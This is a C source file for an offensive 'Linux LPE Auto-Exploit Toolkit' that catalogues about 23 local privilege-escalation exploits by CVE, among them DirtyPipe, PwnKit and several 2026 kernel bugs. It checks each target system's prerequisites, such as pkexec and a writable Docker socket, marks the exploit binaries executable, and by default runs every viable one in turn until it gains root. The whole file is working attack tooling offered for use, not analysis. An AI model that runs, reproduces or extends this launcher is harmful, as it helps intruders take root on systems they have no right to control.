/*
 * Linux LPE Auto-Exploit Toolkit 2026 - UNIVERSAL
 * BOB RESEARCH LABS
 * 
 * IMPROVEMENTS:
 * - Fully static compilation (no missing libs)
 * - Better kernel compatibility checks
 * - Verbose mode for debugging
 * - Enhanced error reporting
 */

#define _GNU_SOURCE
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <pwd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <unistd.h>

#define MAX_EXPLOITS 23
#define MAX_NAME 64
#define MAX_PATH 256
#define VERSION "2.5-universal"

typedef struct {
    char binary[MAX_NAME];
    char name[MAX_NAME];
    char cve[MAX_NAME];
    int viable;
} Exploit;

static Exploit exploits[MAX_EXPLOITS];
static int exploit_count = 0;
static int viable_count = 0;

// ANSI colors
#define RED     "\033[1;31m"
#define GREEN   "\033[1;32m"
#define YELLOW  "\033[1;33m"
#define CYAN    "\033[1;36m"
#define WHITE   "\033[1;37m"
#define RESET   "\033[0m"

static void add_exploit(const char *binary, const char *name, const char *cve) {
    if (exploit_count >= MAX_EXPLOITS) return;
    strncpy(exploits[exploit_count].binary, binary, MAX_NAME - 1);
    strncpy(exploits[exploit_count].name, name, MAX_NAME - 1);
    strncpy(exploits[exploit_count].cve, cve, MAX_NAME - 1);
    exploits[exploit_count].viable = 0;
    exploit_count++;
}

static void init_exploits(void) {
    // 2026 CVEs (newest first)
    add_exploit("packet-edit-meme-static", "PACKET_EDIT_MEME", "CVE-2026-46331");
    add_exploit("fragnesia-static", "Fragnesia", "CVE-2026-46300");
    add_exploit("fragnesia2-static", "Fragnesia v2", "Fragnesia v2");
    add_exploit("cifswitch-static", "CIFSwitch", "CVE-2026-46243");
    add_exploit("bad-epoll-static", "Bad Epoll", "CVE-2026-46242");
    add_exploit("dirtyclone-static", "DirtyClone", "CVE-2026-43503");
    add_exploit("dirtyfrag-static", "DirtyFrag", "CVE-2026-43284");
    add_exploit("pack2theroot-static", "Pack2TheRoot", "CVE-2026-41651");
    add_exploit("fuse-oob-static", "FUSE OOB", "CVE-2026-31694");
    add_exploit("dirtydecrypt-static", "DirtyDecrypt", "CVE-2026-31635");
    add_exploit("copyfail-go-static", "CopyFail", "CVE-2026-31431");
    add_exploit("ipv6-frag-escape-static", "IPv6 Frag Escape", "6.12.x container escape");
    add_exploit("pintheft-static", "PinTheft", "PinTheft");
    // 2024 CVEs
    add_exploit("nft-uaf-static", "nft UAF", "CVE-2024-1086");
    // 2023 CVEs
    add_exploit("ovfs-fuse-static", "OvFS+FUSE", "CVE-2023-0386");
    // 2022 CVEs
    add_exploit("nft-uaf2-static", "nft UAF2", "CVE-2022-2586");
    add_exploit("dirtypipe-static", "DirtyPipe", "CVE-2022-0847");
    // 2021 CVEs
    add_exploit("pwnkit-new-static", "PwnKit", "CVE-2021-4034");
    add_exploit("polkit-dbus-static", "Polkit D-Bus", "CVE-2021-3560");
    add_exploit("overlayfs-static", "OverlayFS", "CVE-2021-3493");
    add_exploit("netfilter-oob-static", "netfilter OOB", "CVE-2021-22555");
    // Problematic exploits (moved to bottom)
    add_exploit("pidfd-race-static", "pidfd-race", "CVE-2026-46333");
    // Other
    add_exploit("docker-sock-static", "Docker Socket", "Docker Socket");
}

static int file_exists(const char *path) {
    return access(path, F_OK) == 0;
}

static int check_viable(const char *binary) {
    if (!file_exists(binary)) return 0;
    
    // Special checks
    if (strstr(binary, "cifswitch")) {
        if (!file_exists("/usr/sbin/cifs.upcall") && !file_exists("/sbin/cifs.upcall"))
            return 0;
    }
    if (strstr(binary, "docker-sock")) {
        if (access("/var/run/docker.sock", W_OK) != 0)
            return 0;
    }
    if (strstr(binary, "pwnkit")) {
        if (!file_exists("/usr/bin/pkexec"))
            return 0;
    }
    if (strstr(binary, "polkit-dbus")) {
        if (system("command -v dbus-send >/dev/null 2>&1") != 0)
            return 0;
    }
    if (strstr(binary, "pack2theroot")) {
        if (system("command -v dbus-send >/dev/null 2>&1") != 0)
            return 0;
        if (!file_exists("/usr/bin/pkcon") && !file_exists("/usr/sbin/packagekitd"))
            return 0;
    }
    if (strstr(binary, "fuse-oob")) {
        if (!file_exists("/usr/bin/fusermount3") && !file_exists("/bin/fusermount3"))
            return 0;
    }
    
    return 1;
}

static void print_header(void) {
    printf(WHITE);
    printf("╔══════════════════════════════════════════════════════════════╗\n");
    printf("║     Linux LPE Auto-Exploit Toolkit 2026 v%-18s║\n", VERSION);
    printf("║                    BOB RESEARCH LABS                        ║\n");
    printf("║        Universal | Static | Multi-Arch | LSM-Aware         ║\n");
    printf("╚══════════════════════════════════════════════════════════════╝\n");
    printf(RESET "\n");
}

static void print_system_info(void) {
    struct utsname uts;
    struct passwd *pw = getpwuid(getuid());
    
    uname(&uts);
    
    printf(CYAN "[*] System Information:\n" RESET);
    printf("    OS: " WHITE "%s %s" RESET "\n", uts.sysname, uts.release);
    printf("    Kernel: " WHITE "%s" RESET "\n", uts.release);
    printf("    Architecture: " WHITE "%s" RESET "\n", uts.machine);
    printf("    User: " WHITE "%s" RESET " (uid=%d)\n\n", 
           pw ? pw->pw_name : "unknown", getuid());
}

static void analyze_exploits(void) {
    printf(CYAN "[*] Initializing toolkit...\n" RESET);
    printf(CYAN "[*] Setting permissions for exploit binaries...\n" RESET);
    
    for (int i = 0; i < exploit_count; i++) {
        if (file_exists(exploits[i].binary)) {
            chmod(exploits[i].binary, 0755);
            printf("    " GREEN "✓" RESET " chmod +x %s\n", exploits[i].binary);
        }
    }
    printf("\n");
    
    printf(CYAN "[*] Analyzing vulnerabilities...\n" RESET "\n");
    
    printf(WHITE);
    printf("╔══════════════════════════════════════════════════════════════╗\n");
    printf("║                    Available Exploits                       ║\n");
    printf("╚══════════════════════════════════════════════════════════════╝\n");
    printf(RESET "\n");
    
    viable_count = 0;
    for (int i = 0; i < exploit_count; i++) {
        exploits[i].viable = check_viable(exploits[i].binary);
        
        if (exploits[i].viable) {
            printf("[%d]  " GREEN "✓" RESET " %s (%s)\n", 
                   i + 1, exploits[i].name, exploits[i].cve);
            viable_count++;
        } else if (!file_exists(exploits[i].binary)) {
            printf("[%d]  " RED "✗" RESET " %s (%s) " RED "[Binary not found]" RESET "\n",
                   i + 1, exploits[i].name, exploits[i].cve);
        } else {
            printf("[%d]  " RED "✗" RESET " %s (%s) " YELLOW "[Requirements not met]" RESET "\n",
                   i + 1, exploits[i].name, exploits[i].cve);
        }
    }
    
    printf("\n" CYAN "[*] Found " GREEN "%d" CYAN " viable exploits for this system\n" RESET "\n", 
           viable_count);
}

static void show_menu(void) {
    printf(WHITE);
    printf("╔══════════════════════════════════════════════════════════════╗\n");
    printf("║                          Options                            ║\n");
    printf("╚══════════════════════════════════════════════════════════════╝\n");
    printf(RESET "\n");
    printf(GREEN "[0]    " RESET "Auto-run all viable exploits (recommended)\n");
    printf(CYAN "[1-%d]" RESET " Select specific exploit number\n", exploit_count);
    printf(YELLOW "[99]   " RESET "Show detailed info about each exploit\n");
    printf(RED "[00]   " RESET "Quit\n\n");
}

static int run_exploit(int idx) {
    if (idx < 0 || idx >= exploit_count) return -1;
    
    Exploit *e = &exploits[idx];
    printf(GREEN "[+] Selected: %s (%s)\n" RESET, e->name, e->cve);
    printf(CYAN "[*] Running exploit...\n" RESET "\n");
    printf("════════════════════════════════════════════════════════════════\n");
    
    // Save original UID to check if we got root
    uid_t orig_uid = getuid();
    uid_t orig_euid = geteuid();
    
    char cmd[MAX_PATH + 16];
    snprintf(cmd, sizeof(cmd), "./%s", e->binary);
    
    int status = system(cmd);
    int exit_code = WIFEXITED(status) ? WEXITSTATUS(status) : -1;
    
    // Check if we actually got root after exploit
    if (geteuid() == 0 && getuid() == 0) {
        // Actually got root!
        return 0;
    }
    
    // If exploit claims success but we're not root, it's a false positive
    if (exit_code == 0 && geteuid() != 0) {
        printf(YELLOW "[-] Exploit reported success but we're not root (false positive)\n" RESET);
        return -1;
    }
    
    return exit_code;
}

static void auto_run(void) {
    printf(GREEN "[*] Auto-exploitation mode enabled\n" RESET);
    printf(CYAN "[*] Will try %d viable exploits in order...\n" RESET "\n", viable_count);
    printf(YELLOW "[!] Note: Some exploits may hang or crash. Press Ctrl+C to skip.\n" RESET "\n");
    
    int count = 1;
    for (int i = 0; i < exploit_count; i++) {
        if (!exploits[i].viable) continue;
        
        printf(CYAN "[%d/%d] Trying: %s (%s)...\n" RESET, 
               count, viable_count, exploits[i].name, exploits[i].cve);
        
        int result = run_exploit(i);
        
        if (result == 0) {
            printf(GREEN "\n[+] SUCCESS! Exploit worked - you should be root now.\n" RESET);
            return;
        }
        
        printf(YELLOW "[-] Failed. Moving to next exploit...\n" RESET "\n");
        
        // Small delay between exploits to allow system to stabilize
        usleep(500000); // 0.5 second delay
        count++;
    }
    
    printf(RED "[-] All exploits failed. System may be fully patched.\n" RESET);
}

static void show_info(void) {
    system("clear");
    printf(WHITE "════════════════════════════════════════════════════════════════\n" RESET);
    printf(WHITE "                 EXPLOIT INFORMATION\n" RESET);
    printf(WHITE "════════════════════════════════════════════════════════════════\n" RESET "\n");
    
    for (int i = 0; i < exploit_count; i++) {
        printf(CYAN "[%d] %s - %s\n" RESET, i + 1, exploits[i].name, exploits[i].cve);
        printf("    Binary: %s\n", exploits[i].binary);
        if (exploits[i].viable) {
            printf("    Status: " GREEN "✓ Viable\n" RESET);
        } else if (!file_exists(exploits[i].binary)) {
            printf("    Status: " RED "✗ Binary not found\n" RESET);
        } else {
            printf("    Status: " RED "✗ Requirements not met\n" RESET);
        }
        printf("\n");
    }
    
    printf(WHITE "════════════════════════════════════════════════════════════════\n" RESET "\n");
    printf("Press Enter to return to menu...");
    getchar();
}

int main(int argc, char *argv[]) {
    // Change to script directory
    if (argc > 0) {
        char *dir = strdup(argv[0]);
        char *slash = strrchr(dir, '/');
        if (slash) {
            *slash = '\0';
            if (chdir(dir) < 0) {
                perror("chdir");
            }
        }
        free(dir);
    }
    
    init_exploits();
    print_header();
    print_system_info();
    analyze_exploits();
    
    if (viable_count == 0) {
        printf(RED "[-] No viable exploits found for this system.\n" RESET);
        return 1;
    }
    
    while (1) {
        show_menu();
        printf("Your choice: ");
        fflush(stdout);
        
        char input[16];
        if (!fgets(input, sizeof(input), stdin)) break;
        
        // Remove newline
        input[strcspn(input, "\n")] = 0;
        
        // Check for "00" exit command BEFORE atoi()
        if (strcmp(input, "00") == 0) {
            printf(CYAN "[*] Exiting...\n" RESET);
            break;
        }
        
        int choice = atoi(input);
        printf("\n");
        
        if (choice == 0) {
            auto_run();
            break;
        } else if (choice == 99) {
            show_info();
            system("clear");
            print_header();
            print_system_info();
            analyze_exploits();
        } else if (choice >= 1 && choice <= exploit_count) {
            int idx = choice - 1;
            if (!exploits[idx].viable) {
                printf(RED "[-] Exploit not viable\n" RESET "\n");
                continue;
            }
            run_exploit(idx);
            break;
        } else {
            printf(RED "[-] Invalid choice\n" RESET "\n");
        }
    }
    
    return 0;
}
